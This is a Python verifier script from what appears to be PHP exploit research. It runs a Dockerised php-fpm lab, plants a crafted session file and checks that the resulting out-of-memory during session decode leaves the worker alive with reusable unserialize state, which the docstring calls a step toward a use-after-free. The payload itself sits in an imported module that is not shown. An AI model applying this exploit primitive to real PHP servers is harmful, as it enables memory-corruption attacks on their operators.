#!/usr/bin/env python3
"""Verify: the session_start()-decode-OOM arm SURVIVES on a fresh php-fpm worker
with NO explicit unserialize() in the app (fresh-container-per-trial, black-box).

App (lab/a7r5/html/sess_arm.php): `session_start(); if(isset($_POST['x']))
$_SESSION['x']=$_POST['x'];` - ordinary session usage only. The arm seeds the SID's
record = session_start_oom_arm.session_record() (the `php` handler's `x|<amplifier>`)
into the pool's session.save_path, then GETs /sess_arm.php with that SID; the decode
OOMs mid-php_var_unserialize and the bailout is caught by php_execute_script's
zend_first_try -> the worker survives, BG(unserialize) left {data=d, level=1}
(reusable; the dangle-reuse -> var_unserializer.re:166 UAF is proven on the ASAN cli
build - see session_start_oom_arm.py docstring).

Lab (php:8.4.26-fpm behind nginx, pm=static/1/128M, profile `a7r5`, session.save_path
=/tmp, upload_progress.cleanup=0):
    docker compose -f docker-compose.fpm-avenues.yml --profile a7r5 up -d --build
    # nginx on 127.0.0.1:8167
Run:
    python3 -I poc/primitives/groom/verify_session_start_oom_arm.py [ntrials]
The verifier drives the profile up/down itself (persistent-worker reliability must be
fresh-container-per-trial). PASS = every trial OOMed AND the same worker PID served
before and after. SKIP if docker/lab is unavailable.

Measured here on php:8.4.26-fpm: 6/6 SURVIVED, 6/6 OOMED.
(WSL2 bind-mount note: a freshly added script's first touch can 404 on a cold worker;
the verifier warms each path and retries the measured GET only while it 404s - a 404
means the script never executed, so retrying is safe and never hides an OOM.)
"""
import os
import subprocess
import sys
import time
import urllib.error
import urllib.request

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.groom.session_start_oom_arm import session_record  # noqa: E402

REPO_ROOT = os.path.dirname(_POC_ROOT)
COMPOSE_FILE = os.path.join(REPO_ROOT, "docker-compose.fpm-avenues.yml")
BASE = "http://127.0.0.1:8167"
PROFILE = "a7r5"
FPM_CONTAINER = "p2s-a7r5-fpm"
SID = "sessarmverify001"


def compose(*a, t=120):
    return subprocess.run(["docker", "compose", "-f", COMPOSE_FILE, "--profile", PROFILE, *a],
                          cwd=REPO_ROOT, capture_output=True, text=True, timeout=t)


def get(path, cookie=None, t=90):
    req = urllib.request.Request(BASE + path)
    if cookie:
        req.add_header("Cookie", cookie)
    try:
        with urllib.request.urlopen(req, timeout=t) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return None, repr(e).encode()


def worker_pid(tries=1):
    for _ in range(tries):
        st, b = get("/probe.php", t=10)
        if st == 200 and b.startswith(b"ALIVE:"):
            return b.split(b":", 1)[1].decode().strip()
        time.sleep(0.5)
    return None


def ready():
    return worker_pid(tries=60) is not None


def warm(path, tries=15):
    for _ in range(tries):
        if get(path, t=20)[0] == 200:
            return True
        time.sleep(0.3)
    return False


def seed(record):
    # root-owned by default is unreadable by the uid-1000 worker -> chmod 666.
    subprocess.run(["docker", "exec", "-i", FPM_CONTAINER, "sh", "-c",
                    f"cat > /tmp/sess_{SID}; chmod 666 /tmp/sess_{SID}"],
                   input=record, capture_output=True, timeout=60)


def oomed_in_log():
    r = subprocess.run(["docker", "logs", "--tail", "6", FPM_CONTAINER],
                       capture_output=True, text=True, timeout=10)
    return "Allowed memory size" in (r.stdout + r.stderr)


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 6
    if subprocess.run(["docker", "version"], capture_output=True).returncode != 0:
        print("SKIP: docker unavailable"); return
    record = session_record()
    survived = oomed = 0
    for i in range(1, n + 1):
        compose("down", t=60)
        if compose("up", "-d", "--build").returncode != 0 or not ready():
            print(f"trial {i}: SKIP (boot failed)"); compose("down", t=60); return
        warm("/probe.php"); warm("/sess_arm.php")   # clear WSL2 neg-dentry
        p0 = worker_pid(tries=10)
        seed(record)
        for _ in range(20):                          # retry only while 404 (no exec)
            st, _b = get("/sess_arm.php", cookie=f"PHPSESSID={SID}")
            if st != 404:
                break
            time.sleep(0.3)
        is_oom = oomed_in_log()
        p1 = worker_pid(tries=10)
        ok = (p1 is not None and p0 == p1)
        survived += ok; oomed += is_oom
        print(f"trial {i}: resp={st} oom={is_oom} p0={p0} p1={p1} -> {'SURVIVED' if ok else 'LOST'}")
    compose("down", t=60)
    verdict = "PASS" if (survived == n and oomed == n) else "FAIL"
    print(f"\n{verdict}: survived={survived}/{n} oomed={oomed}/{n}")


if __name__ == "__main__":
    main()
